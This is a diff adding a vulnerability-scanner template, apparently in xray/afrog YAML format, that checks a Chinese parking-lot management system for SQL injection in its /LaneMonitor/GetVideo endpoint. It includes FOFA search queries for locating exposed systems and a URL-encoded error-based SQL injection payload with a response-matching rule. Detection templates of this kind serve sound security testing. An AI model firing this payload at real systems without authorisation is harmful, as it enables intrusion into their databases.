@@ -1,0 +1,20 @@
+id: lanemonitor-getvideo-sqli
+
+info:
+  name: 停车场后台管理系统GetVideo存在SQL注入漏洞
+  author: 熊猫也是猫
+  severity: high
+  verified: false
+  description: |-
+    fofa: title="智能停车管理系统" || body="/Login/GetAccounts"
+    fofa: icon_hash="938984120"
+  tags: lanemonitor,sqli
+  created: 2025/04/10
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /LaneMonitor/GetVideo?passwayno=1%27+AND+GTID_SUBSET%28CONCAT%280x71627a7871%2C%28SELECT+%28ELT%283079%3D3079%2C1%29%29%29%2C0x7176786b71%29%2C3079%29+AND+%27OVwj%27%3D%27OVwj
+    expression: response.status == 200 && response.body.bcontains(b'qbzx')
+expression: r0()
